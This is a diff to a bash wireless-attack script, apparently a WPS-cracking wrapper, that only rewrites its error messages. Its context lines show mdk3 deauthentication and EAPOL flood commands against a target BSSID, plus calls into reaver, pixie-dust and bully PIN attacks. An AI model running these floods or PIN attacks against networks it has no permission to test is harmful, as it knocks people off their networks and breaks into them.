@@ -119,7 +119,7 @@ function enable2_wlan
 {
 	echo -e "Enabling $WLANN..."
 	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
-	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
+	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"eht3 returned an error (0) (Wireless adapter => ?)"$CE""
 }
 function start2_menu
 {
@@ -166,7 +166,7 @@ function stop2_monitor
 		then
 			echo -e ""$YS"Done"$CE"" && O2=1
 		else
-			echo -e ""$RS"Error stoping monitor mode."$CE""
+			echo -e ""$RS"eht3 returned a fatal error (Unknown)"$CE""
 		fi
 	else
 		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
@@ -284,7 +284,7 @@ function scan_wash
 		wash_awk
 		if [[ "$lines" = 0 ]]
 		then
-			echo -e ""$RS"No networks with WPS found nearby"$CE""
+			echo -e ""$RS"eht3 returned an error (6) (Networks with WPS found nearby)"$CE""
 		fi
 		echo -e ""$YS" r"$CE") Rescan"
 		echo -e ""$YS" b"$CE") Go back"
@@ -301,7 +301,7 @@ function scan_wash
 		then
 			if [[ "$WASHSCAN" -gt "$lines" ]]
 			then
-				echo -e ""$RS"Wrone choice..."$CE""
+				echo -e ""$RS"eht3 returned a fatal error (Wrong choice)"$CE""
 				SCW=0
 				sleep 2
 				continue
@@ -316,7 +316,7 @@ function scan_wash
 			if [[ ! "${alock[WASHSCAN2]}" = "No" ]]
 			then
 				clear
-				echo -e ""$RS"This AP is locked"$CE""
+				echo -e ""$RS"eht3 returned an error (3) (This AP is locked)"$CE""
 				sleep 1
 				SCW=0
 				echo -e "Do you want to try to unlock it?"$YNYES""
@@ -429,7 +429,7 @@ do
 					CURIN="${NI[$n]}"
 					if [[ "$CURIN" = "" ]]
 					then
-						echo -e ""$RS"Error 15. Interface not found."$CE""
+						echo -e ""$RS"eht3 returned an error (15) (Interface not found)"$CE""
 						sleep 3
 					else
 						xterm -T "DOS flood on $CURIN" -hold -e 'mdk3 $CURIN a -a $BSSIDT -m && echo -e "" && echo -e "Close this window manually"' & disown
@@ -450,7 +450,7 @@ do
 		fi
 		if [[ "$PPS" -le 0 ]]
 		then
-			echo -e ""$RS"Wrong choice"$CE""
+			echo -e ""$RS"eht3 returned a fatal error (Wrong choice)"$CE""
 			sleep 2
 			continue
 		fi
@@ -473,7 +473,7 @@ do
 					export CURIN
 					if [[ "$CURIN" = "" ]]
 					then
-						echo -e ""$RS"Error 16. Interface not found."$CE""
+						echo -e ""$RS"eht3 returned an error (16) (Interface not found)"$CE""
 						sleep 3
 					else
 						xterm -T "EAPOL start flood on $CURIN" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
@@ -505,7 +505,7 @@ do
 					newints=$((INTS-1))
 					if [[ "$newints" -lt 1 ]]
 					then
-						echo -e ""$RS"No interfaces added to reset"$CE""
+						echo -e ""$RS"eht3 returned a fatal error (No interfaces added to reset)"$CE""
 						sleep 2
 						break
 					else
@@ -520,7 +520,7 @@ do
 				TEST3=$(ifconfig | grep "$NII")
 				if [[ "$TEST3" = "" ]]
 				then
-					echo -e ""$RS"Could not find this interface on your system"$CE""
+					echo -e ""$RS"eht3 returned a fatal error (Could not find this interface on your system)"$CE""
 					sleep 3
 				else
 					echo -e ""$BS"Interface found!"$CE""
@@ -534,7 +534,7 @@ do
 						checkmonitor=$(iwconfig "$NII"mon | grep "Mode:Monitor")
 						if [[ "$checkmonitor" = "" ]]
 						then
-							echo -e ""$RS"Couldn't start monitor mode"$CE""
+							echo -e ""$RS"eht3 returned a fatal error (Couldn't start monitor mode)"$CE""
 							sleep 2
 							continue
 						fi
@@ -608,7 +608,7 @@ function pixie_loop
 			TTT3=$(cat "$EPATH"/wpslogloop | grep "WPA")
 			if [[ "$TTT" != "" || "$TTTT" != "" ]]
 			then
-				echo -e ""$RS"Pin not found. Retrying..."$CE""
+			        echo -e ""$RS"eht3 returned an error (4) (Pin not found)"$CE""
 			elif [[ "$TTT2" != "" || "$TT3" != "" ]]
 			then
 				echo -e ""$YS"Pin found!!"$CE""
@@ -616,7 +616,7 @@ function pixie_loop
 				sleep 2
 				break
 			else
-				echo -e ""$RS"Pin not found. Retrying..."$CE""
+				echo -e ""$RS"eht3 returned an error (4) (Pin not found)"$CE""
 			fi
 			if [[ "$DELAY" -gt 1 ]]
 			then
@@ -627,7 +627,7 @@ function pixie_loop
 			fi
 			sleep $DELAY
 		else
-			echo -e ""$RS"Error 10. Could not locate wpslogloop file."$CE""
+			echo -e ""$RS"eht3 returned an error (10) (Could not locate wpslogloop file)"$CE""
 			sleep 4
 			break
 		fi
@@ -903,7 +903,7 @@ do
 	then
 		if [[ "$OK" = 0 ]]
 		then
-			echo -e ""$RS"Error 1"$CE""
+			echo -e ""$RS"eht3 returned an error (1) (Unknown)"$CE""
 			sleep 3
 		else
 			if [[ "$BRUTE" = "ON" ]]
@@ -1078,7 +1078,7 @@ then
 	then
 		reaver_attack
 	else
-		echo -e ""$RS"No network selected"$CE""
+		echo -e ""$RS"eht3 returned an error (8) (No network selected)"$CE""
 		sleep 2
 	fi
 elif [[ "$YN" = "3" ]]
@@ -1092,7 +1092,7 @@ then
 		echo -e "Press "$YS"enter"$CE" to go back"
 		read
 	else
-		echo -e ""$RS"No network selected"$CE""
+		echo -e ""$RS"eht3 returned an error (8) (No network selected)"$CE""
 		sleep 2
 	fi
 
@@ -1102,7 +1102,7 @@ then
 	then
 		pixie_attack
 	else
-		echo -e ""$RS"No network selected"$CE""
+		echo -e ""$RS"eht3 returned an error (8) (No network selected)"$CE""
 		sleep 2
 	fi
 elif [[ "$YN" = "5" ]]
@@ -1111,7 +1111,7 @@ then
 	then
 		pixie_loop
 	else
-		echo -e ""$RS"No network selected"$CE""
+		echo -e ""$RS"eht3 returned an error (8) (No network selected)"$CE""
 		sleep 2
 	fi
 elif [[ "$YN" = "6" ]]
@@ -1122,7 +1122,7 @@ then
 		then
 			bully_script
 		else
-			echo -e ""$RS"No network selected"$CE""
+			echo -e ""$RS"eht3 returned an error (8) (No network selected)"$CE""
 			sleep 2
 		fi
 	else
